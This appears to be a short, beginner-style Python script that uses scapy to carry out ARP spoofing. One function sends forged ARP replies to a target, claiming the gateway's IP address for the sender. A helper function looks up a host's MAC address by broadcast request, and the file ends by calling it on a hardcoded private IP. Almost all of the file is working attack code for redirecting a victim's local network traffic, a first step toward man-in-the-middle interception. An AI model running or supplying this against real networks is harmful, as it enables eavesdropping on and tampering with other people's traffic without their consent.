#!/usr/bin/env python3
import scapy.all as scapy

## function to spoof, tip means target ip ans sip means spoof if
def spoof(tip, sip):
    ## tmac is target mac
    tmac = gm(tip)
## creating a packet, op is 2 to send a response not a request, pdst is target ip, hwdst is target mac, psrc is gateway ip.
    packet = scapy.ARP(op=2, pdst=tip, hwdst=tmac, psrc=sip)
## below code will send the packet, In brackets you have to specify the packet name created.
    scapy.send(packet)

## Fuction To Get Mac Address
def gm(ip): 
    ## ar means arp request, creating a arp request 
    ar = scapy.ARP(pdst=ip) 
    ## seting destination mac to broadcast mac
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff") 
    ## Combining broadcast and arp request together
    arb = broadcast/ar 
    ## srp is used to send packets, ans = location where answered packets are stored, unans = location where unanswered packets are stored.
    ans = scapy.srp(arb, timeout=5, verbose=False)[0]
    ## 
    return ans[0][1].hwsrc

## Below Code Will Show Packet Contents
#print(packet.show())

## Below Code Will Show Summary
#print(packet.summary())
gm("172.25.192.1")